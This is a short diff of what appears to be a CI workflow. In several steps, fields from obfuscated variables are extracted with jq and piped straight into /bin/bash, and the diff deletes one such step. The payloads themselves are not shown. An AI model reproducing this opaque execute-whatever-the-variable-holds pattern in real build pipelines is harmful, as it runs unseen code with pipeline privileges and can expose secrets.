@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$t8" | jq -r .ujewq0234 | /bin/bash
           printf '%s' "$i145" | jq -r .yr9 | /bin/bash
           echo $ta25453 | jq -r .dxhkt000 | /bin/bash
-          echo $qxst48 | jq -r .yhrlc0467 | /bin/bash
           echo $md02445 | jq -r .d4 | /bin/bash
 
       - name: Persist output
